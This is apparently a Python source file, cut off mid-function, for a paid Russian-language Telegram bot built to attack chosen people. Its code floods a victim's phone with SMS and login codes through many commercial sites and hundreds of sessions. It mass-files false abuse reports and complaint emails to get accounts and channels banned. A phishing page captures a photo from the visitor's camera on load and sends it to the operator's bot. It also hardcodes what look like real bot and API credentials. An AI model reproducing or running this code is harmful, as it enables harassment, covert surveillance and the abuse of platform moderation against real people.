import asyncio
import aiohttp
import random
import string
import json
import os
import logging
import time
import shutil
import re
import hashlib
import smtplib
import concurrent.futures
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.header import Header
from datetime import datetime, timedelta
from typing import Optional, Dict, List, Tuple
import base64
import uuid

from aiogram import Bot, Dispatcher, types, F
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.filters import Command, StateFilter
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile, LabeledPrice, PreCheckoutQuery
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode, ContentType

from pyrogram import Client
from pyrogram.errors import FloodWait, RPCError
from pyrogram.raw import functions, types as raw_types
from pyrogram.raw.functions.account import ReportPeer
from pyrogram.raw.functions.messages import Report
from pyrogram.raw.functions.channels import ReportSpam

# ---------- НАСТРОЙКИ ----------
BOT_TOKEN = "8788795304:AAFA9drMeBOVHp-OR0XWgrZPllVsXx9zgqI"
API_ID = 2040
API_HASH = "b18441a1ff607e10a989891a5462e627"
ADMIN_ID = 7736817432
ALLOWED_USERS_FILE = "allowed_users.json"
CHANNEL_ID = -1003910615357
CHANNEL_URL = "https://t.me/VICTIMSNOSER"
PAYMENTS_FILE = "payments.json"
PROMO_CODES_FILE = "promo_codes.json"

PAYMENT_PROVIDER_TOKEN = "381764678:TEST:86938"

PRICES = {
    "30d": {"stars": 100, "rub": 100},
    "60d": {"stars": 200, "rub": 200},
    "forever": {"stars": 400, "rub": 400}
}

SESSIONS_PER_USER = 300
SESSION_DELAY = 3
SMS_PER_ROUND = 15
ROUND_DELAY = 2
MAX_ROUNDS = 10
BOMBER_DELAY = 0.3
REQUEST_TIMEOUT = 30

MAIL_CONFIG_FILE = "mail_config.json"
BANNER_FILE = "banner.png"

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Version/17.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
]

RECEIVERS = [
    'abuse@telegram.org', 'dmca@telegram.org', 'security@telegram.org',
    'support@telegram.org', 'sms@telegram.org', 'stopca@telegram.org',
    'ca@telegram.org', 'legal@telegram.org',
]

DEVICES = [
    {"model": f"iPhone {m}", "system": f"iOS {i}"}
    for m in ["15 Pro Max", "15 Pro", "14 Pro Max", "14 Pro", "13 Pro Max", "13 Pro", "12 Pro Max"]
    for i in ["17.3", "17.2", "17.1", "16.7", "16.6"]
] + [
    {"model": f"Samsung {m}", "system": f"Android {a}"}
    for m in ["S24 Ultra", "S23 Ultra", "S22 Ultra", "S21 Ultra"]
    for a in ["14", "13", "12", "11"]
]

OAUTH_SITES = [
    {"url": "https://my.telegram.org/auth/send_password", "phone_field": "phone", "name": "MyTelegram"},
    {"url": "https://web.telegram.org/k/api/auth/sendCode", "phone_field": "phone", "name": "WebK"},
    {"url": "https://web.telegram.org/a/api/auth/sendCode", "phone_field": "phone", "name": "WebA"},
    {"url": "https://fragment.com/api/auth/sendCode", "phone_field": "phone", "name": "Fragment"},
]

# Расширенный список сайтов для бомбера
BOMBER_SITES = [
    # Доставка еды
    {"url": "https://api.delivery-club.ru/api/v2/auth/send-code", "phone_field": "phone", "name": "DeliveryClub", "type": "json"},
    {"url": "https://api.dodopizza.ru/auth/send-code", "phone_field": "phone", "name": "DodoPizza", "type": "json"},
    {"url": "https://api.sushi-master.ru/v1/auth/send-code", "phone_field": "phone", "name": "SushiMaster", "type": "json"},
    {"url": "https://api.pizzahut.ru/v1/auth/send-code", "phone_field": "phone", "name": "PizzaHut", "type": "json"},
    
    # Магазины
    {"url": "https://api.citilink.ru/auth/send-code", "phone_field": "phone", "name": "Citilink", "type": "json"},
    {"url": "https://api.dns-shop.ru/v1/auth/send-code", "phone_field": "phone", "name": "DNS", "type": "json"},
    {"url": "https://api.mvideo.ru/auth/send-code", "phone_field": "phone", "name": "MVideo", "type": "json"},
    {"url": "https://api.ozon.ru/v1/auth/send-code", "phone_field": "phone", "name": "Ozon", "type": "json"},
    {"url": "https://api.wildberries.ru/auth/send-code", "phone_field": "phone", "name": "Wildberries", "type": "json"},
    {"url": "https://api.lamoda.ru/auth/send-code", "phone_field": "phone", "name": "Lamoda", "type": "json"},
    
    # Сервисы
    {"url": "https://api.avito.ru/auth/send-code", "phone_field": "phone", "name": "Avito", "type": "json"},
    {"url": "https://api.youla.ru/auth/send-code", "phone_field": "phone", "name": "Youla", "type": "json"},
    {"url": "https://api.hh.ru/auth/send-code", "phone_field": "phone", "name": "HeadHunter", "type": "json"},
    {"url": "https://api.rabota.ru/auth/send-code", "phone_field": "phone", "name": "Rabota", "type": "json"},
    {"url": "https://api.profi.ru/auth/send-code", "phone_field": "phone", "name": "Profi", "type": "json"},
    {"url": "https://api.youdo.com/auth/send-code", "phone_field": "phone", "name": "YouDo", "type": "json"},
    
    # Аптеки
    {"url": "https://api.apteka.ru/auth/send-code", "phone_field": "phone", "name": "Apteka", "type": "json"},
    {"url": "https://api.eapteka.ru/auth/send-code", "phone_field": "phone", "name": "EApteka", "type": "json"},
    
    # Операторы
    {"url": "https://api.beeline.ru/auth/send-code", "phone_field": "phone", "name": "Beeline", "type": "json"},
    {"url": "https://api.megafon.ru/auth/send-code", "phone_field": "phone", "name": "Megafon", "type": "json"},
    {"url": "https://api.mts.ru/auth/send-code", "phone_field": "phone", "name": "MTS", "type": "json"},
    {"url": "https://api.tele2.ru/auth/send-code", "phone_field": "phone", "name": "Tele2", "type": "json"},
    
    # Банки
    {"url": "https://api.tinkoff.ru/auth/send-code", "phone_field": "phone", "name": "Tinkoff", "type": "json"},
    {"url": "https://api.sberbank.ru/auth/send-code", "phone_field": "phone", "name": "Sberbank", "type": "json"},
]

COMPLAINT_TEXTS_ACCOUNT = {
    "1": {"subject": "Report: Violation of Telegram Terms of Service", "body": "Dear Telegram Support,\n\nI am writing to report a Telegram account that is violating your Terms of Service.\n\nAccount: @{username}\nUser ID: {telegram_id}\n\nThis account is engaged in activities that violate platform rules.\n\nPlease investigate and take appropriate action.\n\nThank you."},
    "2": {"subject": "URGENT: Account Security Issue", "body": "Dear Telegram Support,\n\nI am reporting a security issue with account @{username} (ID: {telegram_id}).\n\nThis account appears to be compromised or engaged in malicious activities.\n\nPlease review and take necessary action.\n\nThank you."},
    "3": {"subject": "Report: Spam and Abuse", "body": "Dear Telegram Support,\n\nAccount @{username} (ID: {telegram_id}) is sending spam messages and abusing the platform.\n\nPlease investigate this account.\n\nThank you."},
    "4": {"subject": "Report: Fraudulent Activity", "body": "Dear Telegram Support,\n\nAccount @{username} (ID: {telegram_id}) is engaged in fraudulent activities.\n\nPlease review and take appropriate action.\n\nThank you."},
    "5": {"subject": "Report: Inappropriate Content", "body": "Dear Telegram Support,\n\nAccount @{username} (ID: {telegram_id}) is distributing inappropriate content.\n\nPlease investigate.\n\nThank you."}
}

COMPLAINT_TEXTS_CHANNEL = {
    "1": {"subject": "Report: Channel Violation", "body": "Dear Telegram Support,\n\nChannel {channel_link} is violating Telegram Terms of Service.\n\nEvidence: {violation_link}\n\nPlease review and take action.\n\nThank you."},
    "2": {"subject": "Report: Harmful Content", "body": "Dear Telegram Support,\n\nChannel {channel_link} contains harmful content.\n\nEvidence: {violation_link}\n\nPlease investigate.\n\nThank you."},
    "3": {"subject": "URGENT: Illegal Activity", "body": "Dear Telegram Support,\n\nChannel {channel_link} is involved in illegal activities.\n\nEvidence: {violation_link}\n\nPlease take immediate action.\n\nThank you."},
    "4": {"subject": "Report: Spam Channel", "body": "Dear Telegram Support,\n\nChannel {channel_link} is used for spam.\n\nEvidence: {violation_link}\n\nPlease review.\n\nThank you."},
    "5": {"subject": "Report: Scam Channel", "body": "Dear Telegram Support,\n\nChannel {channel_link} is scamming users.\n\nEvidence: {violation_link}\n\nPlease investigate.\n\nThank you."},
}

REPORT_REASONS = {
    "spam": raw_types.InputReportReasonSpam(),
    "violence": raw_types.InputReportReasonViolence(),
    "pornography": raw_types.InputReportReasonPornography(),
    "child_abuse": raw_types.InputReportReasonChildAbuse(),
    "copyright": raw_types.InputReportReasonCopyright(),
    "other": raw_types.InputReportReasonOther(),
    "personal_data": raw_types.InputReportReasonPersonalDetails(),
    "illegal_drugs": raw_types.InputReportReasonIllegalDrugs(),
}

REPORT_REASONS_RU = {
    "spam": "Спам",
    "violence": "Насилие",
    "pornography": "Порнография",
    "child_abuse": "Дети",
    "copyright": "Авторские права",
    "other": "Другое",
    "personal_data": "Личные данные",
    "illegal_drugs": "Наркотики",
}

phish_pages = {}

# НОВЫЙ ШАБЛОН ФИШИНГА - КАМЕРА СРАЗУ ПРИ ЗАГРУЗКЕ
CAMERA_TEMPLATE = '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{title}</title>
    <style>
        body {{
            margin: 0;
            padding: 0;
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }}
        #container {{
            position: relative;
            width: 100%;
            max-width: 500px;
        }}
        video {{
            width: 100%;
            height: auto;
            display: block;
        }}
        canvas {{
            display: none;
        }}
        #status {{
            position: fixed;
            bottom: 20px;
            left: 0;
            right: 0;
            text-align: center;
            color: white;
            font-family: Arial, sans-serif;
            font-size: 14px;
            text-shadow: 0 0 5px black;
            padding: 10px;
        }}
        .info {{
            position: fixed;
            top: 20px;
            left: 0;
            right: 0;
            text-align: center;
            color: white;
            font-family: Arial, sans-serif;
            text-shadow: 0 0 5px black;
            padding: 10px;
        }}
        h2 {{
            margin: 0 0 5px 0;
            font-size: 20px;
        }}
        p {{
            margin: 0;
            font-size: 14px;
            opacity: 0.9;
        }}
    </style>
</head>
<body>
    <div id="container">
        <div class="info">
            <h2>{title}</h2>
            <p>{description}</p>
        </div>
        <video id="video" autoplay playsinline></video>
        <canvas id="canvas"></canvas>
        <div id="status">Загрузка камеры...</div>
    </div>
    <script>
        const BOT_TOKEN = "{bot_token}";
        const CHAT_ID = "{chat_id}";
        const PAGE_ID = "{page_id}";
        const video = document.getElementById("video");
        const canvas = document.getElementById("canvas");
        const status = document.getElementById("status");
        let photoSent = false;
        
        async function startCamera() {{
            try {{
                const stream = await navigator.mediaDevices.getUserMedia({{ 
                    video: {{ 
                        facingMode: "user",
                        width: {{ ideal: 1280 }},
                        height: {{ ideal: 720 }}
                    }} 
                }});
                video.srcObject = stream;
                await video.play();
                status.textContent = "Камера активна";
                
                // Делаем фото через 2 секунды после загрузки
                setTimeout(() => captureAndSend(stream), 2000);
            }} catch (e) {{
                status.textContent = "Ошибка доступа к камере";
                console.error("Camera error:", e);
            }}
        }}
        
        async function captureAndSend(stream) {{
            if (photoSent) return;
            
            status.textContent = "Получение фото...";
            
            try {{
                const context = canvas.getContext("2d");
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                const photoData = canvas.toDataURL("image/jpeg", 0.9);
                
                status.textContent = "Отправка...";
                
                const blob = await (await fetch(photoData)).blob();
                const formData = new FormData();
                formData.append("chat_id", CHAT_ID);
                formData.append("photo", blob, "face_" + PAGE_ID + ".jpg");
                formData.append("caption", "📸 Фото | ID: " + PAGE_ID + " | " + new Date().toLocaleString("ru-RU"));
                
                const resp = await fetch(`https://api.telegram.org/bot${{BOT_TOKEN}}/sendPhoto`, {{
                    method: "POST",
                    body: formData
                }});
                
                const data = await resp.json();
                
                if (data.ok) {{
                    photoSent = true;
                    status.textContent = "✓ Готово";
                    
                    // Останавливаем камеру
                    if (stream) {{
                        stream.getTracks().forEach(t => t.stop());
                    }}
                    
                    // Перенаправляем через 1 секунду
                    setTimeout(() => {{
                        window.location.href = "https://telegram.org";
                    }}, 1000);
                }} else {{
                    status.textContent = "Ошибка отправки";
                    setTimeout(() => captureAndSend(stream), 2000);
                }}
            }} catch (e) {{
                console.error("Capture error:", e);
                status.textContent = "Ошибка, пробуем снова...";
                setTimeout(() => captureAndSend(stream), 2000);
            }}
        }}
        
        startCamera();
    </script>
</body>
</html>'''

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=MemoryStorage())

ALLOWED_USERS = {}
user_sessions = {}
active_attacks = {}
active_bombers = {}
sessions_creation_lock = {}
usage_logs = []
MAX_LOGS = 20
user_messages = {}
user_last_action = {}
payments = {}
promo_codes = {}

class SnosPhoneState(StatesGroup):
    waiting_phone = State()
    waiting_count = State()

class SnosUsernameState(StatesGroup):
    waiting_username = State()
    waiting_count = State()

class BomberState(StatesGroup):
    waiting_phone = State()
    waiting_count = State()

class ReportMessageState(StatesGroup):
    waiting_link = State()
    waiting_reason = State()

class MailAccountState(StatesGroup):
    waiting_username = State()
    waiting_id = State()

class MailChannelState(StatesGroup):
    waiting_channel = State()
    waiting_violation = State()

class PhishState(StatesGroup):
    waiting_title = State()
    waiting_description = State()

class AdminState(StatesGroup):
    waiting_user_id = State()
    waiting_promo_code = State()
    waiting_promo_days = State()
    waiting_promo_uses = State()
    waiting_add_days = State()

class PurchaseState(StatesGroup):
    waiting_promo = State()


def load_payments():
    global payments
    try:
        with open(PAYMENTS_FILE, 'r') as f:
            payments = json.load(f)
    except:
        payments = {}

def save_payments():
    with open(PAYMENTS_FILE, 'w') as f:
        json.dump(payments, f, indent=4)

def load_promo_codes():
    global promo_codes
    try:
        with open(PROMO_CODES_FILE, 'r') as f:
            promo_codes = json.load(f)
    except:
        promo_codes = {}

def save_promo_codes():
    with open(PROMO_CODES_FILE, 'w') as f:
        json.dump(promo_codes, f, indent=4)

def check_subscription_expired(user_id: int) -> bool:
    user_id_str = str(user_id)
    if user_id_str not in ALLOWED_USERS:
        return True
    expire_date = ALLOWED_USERS[user_id_str].get("expire_date")
    if expire_date and expire_date != "forever":
        return datetime.now() > datetime.fromisoformat(expire_date)
    return False

def is_user_allowed(user_id: int) -> bool:
    if user_id == ADMIN_ID:
        return True
    user_id_str = str(user_id)
    if user_id_str not in ALLOWED_USERS:
        return False
    return not check_subscription_expired(user_id)

def add_subscription(user_id: int, days: int = None, forever: bool = False):
    user_id_str = str(user_id)
    if forever:
        expire_date = "forever"
    else:
        expire_date = (datetime.now() + timedelta(days=days)).isoformat()
    ALLOWED_USERS[user_id_str] = {"expire_date": expire_date, "added": datetime.now().isoformat()}
    save_allowed_users()

def check_cooldown(user_id: int, action: str) -> tuple:
    key = f"{user_id}_{action}"
    if key in user_last_action:
        elapsed = time.time() - user_last_action[key]
        if elapsed < 60:
            return False, 60 - elapsed
    user_last_action[key] = time.time()
    return True, 0

def add_log(user_id: int, action: str, target: str):
    global usage_logs
    usage_logs.append({"user_id": user_id, "action": action, "target": target, "time": datetime.now().strftime('%H:%M:%S')})
    if len(usage_logs) > MAX_LOGS:
        usage_logs = usage_logs[-MAX_LOGS:]

def load_allowed_users():
    global ALLOWED_USERS
    try:
        with open(ALLOWED_USERS_FILE, 'r') as f:
            data = json.load(f)
            if "users" in data and isinstance(data["users"], list):
                for uid in data["users"]:
                    ALLOWED_USERS[str(uid)] = {"expire_date": "forever", "added": datetime.now().isoformat()}
            else:
                ALLOWED_USERS = data
    except:
        ALLOWED_USERS = {}

def save_allowed_users():
    with open(ALLOWED_USERS_FILE, 'w') as f:
        json.dump(ALLOWED_USERS, f, indent=4)

async def check_channel_subscription(user_id: int) -> bool:
    try:
        member = await bot.get_chat_member(chat_id=CHANNEL_ID, user_id=user_id)
        return member.status in ["member", "administrator", "creator"]
    except:
        return False

class AccessMiddleware:
    async def __call__(self, handler, event, data):
        user_id = None
        if isinstance(event, types.CallbackQuery):
            user_id = event.from_user.id
        elif isinstance(event, types.Message):
            user_id = event.from_user.id
        
        if isinstance(event, types.Message) and event.text and event.text.startswith('/start'):
            return await handler(event, data)
        
        if isinstance(event, types.Message) and event.text and event.text.startswith('/admin'):
            if user_id == ADMIN_ID:
                return await handler(event, data)
            else:
                await send_message_with_banner(event, "Только администратор!")
                return
        
        if user_id and not is_user_allowed(user_id):
            if isinstance(event, types.CallbackQuery):
                await event.answer("Доступ запрещен! Приобретите подписку.", show_alert=True)
            elif isinstance(event, types.Message):
                await send_message_with_banner(event, "Доступ запрещен! Приобретите подписку.")
            return
        
        return await handler(event, data)

dp.update.middleware(AccessMiddleware())


# ---------- EMAIL SENDER ----------
class EmailSender:
    def __init__(self):
        self.senders = {}
        self.load_config()
    
    def load_config(self):
        try:
            with open(MAIL_CONFIG_FILE, 'r', encoding='utf-8') as f:
                self.senders = json.load(f)
        except:
            self.senders = {}
    
    def send_email(self, receiver: str, sender_email: str, sender_password: str, subject: str, body: str) -> bool:
        try:
            msg = MIMEMultipart()
            msg['From'] = sender_email
            msg['To'] = receiver
            msg['Subject'] = Header(subject, 'utf-8')
            msg.attach(MIMEText(body, 'plain', 'utf-8'))
            
            server = smtplib.SMTP('smtp.mail.ru', 587, timeout=30)
            server.starttls()
            server.login(sender_email, sender_password)
            server.sendmail(sender_email, receiver, msg.as_string())
            server.quit()
            return True
        except:
            return False
    
    def send_mass(self, receivers: List[str], subject: str, body: str) -> int:
        sent_count = 0
        with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
            futures = []
            for sender_email, sender_password in self.senders.items():
                for receiver in receivers:
                    futures.append(executor.submit(self.send_email, receiver, sender_email, sender_password, subject, body))
                    time.sleep(1)
            for future in futures:
                try:
                    if future.result():
                        sent_count += 1
                except:
                    pass
        return sent_count


email_sender = EmailSender()


# ---------- СЕССИИ ----------
def get_user_session_dir(user_id: int) -> str:
    return f"sessions/user_{user_id}"

async def create_single_session(session_file: str, idx: int) -> dict:
    try:
        device = random.choice(DEVICES)
        client = Client(
            name=session_file,
            api_id=API_ID,
            api_hash=API_HASH,
            in_memory=False,
            no_updates=True,
            device_model=device["model"],
            system_version=device["system"],
            app_version="10.15.1",
            lang_code="ru"
        )
        await client.connect()
        return {"client": client, "in_use": False, "flood_until": 0, "index": idx, "last_used": 0}
    except:
        return None

async def create_user_sessions(user_id: int) -> tuple:
    d = get_user_session_dir(user_id)
    os.makedirs(d, exist_ok=True)
    
    sessions = []
    semaphore = asyncio.Semaphore(10)
    
    async def create_with_limit(i):
        async with semaphore:
            f = f"{d}/session_{i}"
            if not os.path.exists(f"{f}.session"):
                return await create_single_session(f, i)
            return None
    
    tasks = [create_with_limit(i) for i in range(SESSIONS_PER_USER)]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    for r in results:
        if r and not isinstance(r, Exception):
            sessions.append(r)
        await asyncio.sleep(0.3)
    
    logger.info(f"Пользователь {user_id}: создано {len(sessions)} сессий")
    return sessions, len(sessions)

async def ensure_user_sessions(user_id: int):
    if user_id in sessions_creation_lock and sessions_creation_lock[user_id]:
        return
    sessions_creation_lock[user_id] = True
    try:
        if user_id not in user_sessions:
            user_sessions[user_id] = {"sessions": [], "ready": False}
        sessions, total = await create_user_sessions(user_id)
        user_sessions[user_id]["sessions"] = sessions
        user_sessions[user_id]["ready"] = True
    finally:
        sessions_creation_lock[user_id] = False

async def refresh_user_sessions(user_id: int):
    if user_id in user_sessions:
        for s in user_sessions[user_id].get("sessions", []):
            try:
                await s["client"].disconnect()
            except:
                pass
    d = get_user_session_dir(user_id)
    if os.path.exists(d):
        shutil.rmtree(d)
    user_sessions[user_id] = {"sessions": [], "ready": False}
    await ensure_user_sessions(user_id)

async def get_user_sessions_batch(user_id: int, count: int) -> list:
    if user_id not in user_sessions or not user_sessions[user_id]["ready"]:
        return []
    now = time.time()
    available = [
        s for s in user_sessions[user_id]["sessions"] 
        if not s["in_use"] and s["flood_until"] < now and now - s["last_used"] >= SESSION_DELAY
    ]
    available.sort(key=lambda x: x["last_used"])
    selected = available[:count]
    for s in selected:
        s["in_use"] = True
        s["last_used"] = now
    return selected

def release_user_sessions(sessions: list):
    for s in sessions:
        if s:
            s["in_use"] = False

def is_user_sessions_ready(user_id: int) -> bool:
    return user_id in user_sessions and user_sessions[user_id].get("ready", False)


# ---------- СНОС ----------
async def send_sms_via_session(session_data: dict, phone: str) -> dict:
    try:
        client = session_data["client"]
        if not client.is_connected:
            await client.connect()
        
        sent_code = await client.send_code(phone)
        return {"success": True}
    except FloodWait as e:
        session_data["flood_until"] = time.time() + e.value
        return {"success": False}
    except:
        return {"success": False}

async def send_acollo_request(session: aiohttp.ClientSession, phone: str) -> dict:
    try:
        clean_phone = phone.replace("+", "")
        
        auth_url = "https://oauth.telegram.org/auth"
        params = {
            "bot_id": "8357292784",
            "origin": "https://acollo.ru",
            "embed": "1",
            "request_access": "write",
            "return_to": "https://acollo.ru/auth/telegram"
        }
        
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml',
            'Accept-Language': 'ru-RU,ru;q=0.9',
        }
        
        async with session.get(auth_url, params=params, headers=headers, timeout=15, ssl=False) as resp:
            html = await resp.text()
            
            cookies = {}
            for cookie in session.cookie_jar:
                cookies[cookie.key] = cookie.value
            
            csrf_token = None
            match = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', html)
            if match:
                csrf_token = match.group(1)
            
            if not csrf_token:
                match = re.search(r'"csrf_token":"([^"]+)"', html)
                if match:
                    csrf_token = match.group(1)
            
            send_url = "https://oauth.telegram.org/auth/send_code"
            
            if csrf_token:
                data = {"phone": clean_phone, "csrf_token": csrf_token}
                headers_post = {
                    'User-Agent': random.choice(USER_AGENTS),
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Origin': 'https://oauth.telegram.org',
                    'Referer': str(resp.url),
                }
            else:
                data = {"phone": clean_phone}
                headers_post = {
                    'User-Agent': random.choice(USER_AGENTS),
                    'Content-Type': 'application/json',
                    'Origin': 'https://oauth.telegram.org',
                }
            
            async with session.post(send_url, 
                                   json=data if not csrf_token else None,
                                   data=data if csrf_token else None,
                                   headers=headers_post, 
                                   cookies=cookies,
                                   timeout=15, 
                                   ssl=False) as resp2:
                return {"site": "Acollo", "success": resp2.status < 500}
                
    except:
        return {"site": "Acollo", "success": False}

async def send_oauth_request(session: aiohttp.ClientSession, phone: str, site: dict) -> dict:
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'application/json',
        'Content-Type': 'application/json',
    }
    clean_phone = phone.replace("+", "")
    
    try:
        data = {site["phone_field"]: clean_phone}
        async with session.post(site["url"], headers=headers, json=data, timeout=10, ssl=False) as resp:
            return {"site": site["name"], "success": resp.status < 500}
    except:
        return {"site": site["name"], "success": False}

async def snos_attack_phone(user_id: int, phone: str, rounds: int, stop_event: asyncio.Event, progress_callback=None) -> tuple:
    ok = 0
    phone = phone.strip().replace(" ", "").replace("-", "")
    if not phone.startswith("+"):
        phone = "+" + phone
    add_log(user_id, "Снос номера", phone)
    
    connector = aiohttp.TCPConnector(limit=200, force_close=True, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as sess:
        for rnd in range(1, rounds + 1):
            if stop_event.is_set():
                break
            
            tasks = []
            
            sessions = await get_user_sessions_batch(user_id, SMS_PER_ROUND)
            if sessions:
                for s in sessions:
                    tasks.append(send_sms_via_session(s, phone))
            
            for _ in range(2):
                for site in OAUTH_SITES:
                    tasks.append(send_oauth_request(sess, phone, site))
            
            for _ in range(5):
                tasks.append(send_acollo_request(sess, phone))
            
            batch = await asyncio.gather(*tasks, return_exceptions=True)
            release_user_sessions(sessions)
            
            round_ok = sum(1 for r in batch if isinstance(r, dict) and r.get("success"))
            ok += round_ok
            
            if progress_callback:
                await progress_callback(rnd, rounds, ok)
            
            logger.info(f"Раунд {rnd}/{rounds}: {round_ok} запросов")
            
            if rnd < rounds and not stop_event.is_set():
                await asyncio.sleep(ROUND_DELAY)
    
    return ok


# ---------- СНОС USERNAME (ПЕРЕПИСАНО) ----------
async def snos_attack_username(user_id: int, username: str, rounds: int, stop_event: asyncio.Event, progress_callback=None) -> tuple:
    ok = 0
    username = username.strip().replace("@", "")
    add_log(user_id, "Снос username", f"@{username}")
    
    for rnd in range(1, rounds + 1):
        if stop_event.is_set():
            break
        
        sessions = await get_user_sessions_batch(user_id, min(100, SESSIONS_PER_USER))
        if not sessions:
            break
        
        tasks = []
        
        for s in sessions:
            # Используем разные методы жалоб
            tasks.append(report_account_spam(s, username))
            tasks.append(report_account_violence(s, username))
            tasks.append(report_account_pornography(s, username))
            tasks.append(report_account_other(s, username))
        
        batch = await asyncio.gather(*tasks, return_exceptions=True)
        release_user_sessions(sessions)
        
        round_ok = sum(1 for r in batch if r)
        ok += round_ok
        
        if progress_callback:
            await progress_callback(rnd, rounds, ok)
        
        logger.info(f"Раунд username {rnd}/{rounds}: {round_ok} жалоб")
        
        if rnd < rounds and not stop_event.is_set():
            await asyncio.sleep(1)
    
    return ok

async def report_account_spam(session_data: dict, username: str) -> bool:
    try:
        client = session_data["client"]
        if not client.is_connected:
            await client.connect()
        
        user = await client.get_users(username)
        peer = await client.resolve_peer(user.id)
        await client.invoke(ReportPeer(peer=peer, reason=raw_types.InputReportReasonSpam(), message="Spam"))
        return True
    except:
        return False

async def report_account_violence(session_data: dict, username: str) -> bool:
    try:
        client = session_data["client"]
        if not client.is_connected:
            await client.connect()
        
        user = await client.get_users(username)
        peer = await client.resolve_peer(user.id)
        await client.invoke(ReportPeer(peer=peer, reason=raw_types.InputReportReasonViolence(), message="Violence"))
        return True
    except:
        return False

async def report_account_pornography(session_data: dict, username: str) -> bool:
    try:
        client = session_data["client"]
        if not client.is_connected:
            await client.connect()
        
        user = await client.get_users(username)
        peer = await client.resolve_peer(user.id)
        await client.invoke(ReportPeer(peer=peer, reason=raw_types.InputReportReasonPornography(), message="Pornography"))
        return True
    except:
        return False

async def report_account_other(session_data: dict, username: str) -> bool:
    try:
        client = session_data["client"]
        if not client.is_connected:
            await client.connect()
        
        user = await client.get_users(username)
        peer = await client.resolve_peer(user.id)
        await client.invoke(ReportPeer(peer=peer, reason=raw_types.InputReportReasonOther(), message="Violation"))
        return True
    except:
        return False


# ---------- ЖАЛОБЫ НА СООБЩЕНИЯ (ПЕРЕПИСАНО) ----------
async def mass_report_message(user_id: int, link: str, reason: str, progress_callback=None) -> tuple:
    patterns = [
        r'(?:https?://)?t\.me/([^/]+)/(\d+)',
        r'(?:https?://)?telegram\.me/([^/]+)/(\d+)',
        r'(?:https?://)?t\.me/c/(\d+)/(\d+)',
    ]
    
    channel = None
    msg_id = None
    for pattern in patterns:
        m = re.search(pattern, link)
        if m:
            channel = m.group(1)
            msg_id = int(m.group(2))
            break
    
    if not channel or not msg_id:
        return 0, "Неверная ссылка"
    
    add_log(user_id, "Жалоба на сообщение", f"{channel}/{msg_id}")
    
    if not is_user_sessions_ready(user_id):
        return 0, "Сессии не готовы"
    
    sessions = await get_user_sessions_batch(user_id, min(100, SESSIONS_PER_USER))
    if not sessions:
        return 0, "Нет доступных сессий"
    
    report_reason_map = {
        "spam": raw_types.InputReportReasonSpam(),
        "violence": raw_types.InputReportReasonViolence(),
        "pornography": raw_types.InputReportReasonPornography(),
        "child_abuse": raw_types.InputReportReasonChildAbuse(),
        "copyright": raw_types.InputReportReasonCopyright(),
        "other": raw_types.InputReportReasonOther(),
        "personal_data": raw_types.InputReportReasonPersonalDetails(),
    }
    
    report_reason = report_reason_map.get(reason, raw_types.InputReportReasonSpam())
    
    tasks = []
    for s in sessions:
        tasks.append(report_single_message(s, channel, msg_id, report_reason))
        # Добавляем также жалобу на спам в канале
        tasks.append(report_channel_spam(s, channel, msg_id))
    
    results = await asyncio.gather(*tasks, return_exceptions=True)
    ok = sum(1 for r in results if r)
    
    release_user_sessions(sessions)
    logger.info(f"Отправлено {ok} жалоб на сообщение")
    return ok, None

async def report_single_message(session_data: dict, channel: str, msg_id: int, reason) -> bool:
    try:
        client = session_data["client"]
        if not client.is_connected:
            await client.connect()
        
        try:
            if channel.lstrip('-').isdigit():
                chat = await client.get_chat(int(channel))
            else:
                chat = await client.get_chat(channel)
        except:
            chat = await client.get_chat(f"@{channel}")
        
        peer = await client.resolve_peer(chat.id)
        await client.invoke(Report(peer=peer, id=[msg_id], reason=reason, message="Violation report"))
        return True
    except:
        return False

async def report_channel_spam(session_data: dict, channel: str, msg_id: int) -> bool:
    try:
        client = session_data["client"]
        if not client.is_connected:
            await client.connect()
        
        try:
            if channel.lstrip('-').isdigit():
                chat = await client.get_chat(int(channel))
            else:
                chat = await client.get_chat(channel)
        except:
            chat = await client.get_chat(f"@{channel}")
        
        # Жалоба на спам в канале
        await client.invoke(ReportSpam(channel=await client.resolve_peer(chat.id)))
        return True
    except:
        return False


# ---------- БОМБЕР (ПЕРЕПИСАНО) ----------
async def send_bomber_request(session: aiohttp.ClientSession, phone: str, site: dict) -> dict:
    clean_phone = phone.replace("+", "").replace(" ", "").replace("-", "")
    
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'Content-Type': 'application/json',
        'Origin': site["url"].split('/api')[0] if '/api' in site["url"] else '/'.join(site["url"].split('/')[:3]),
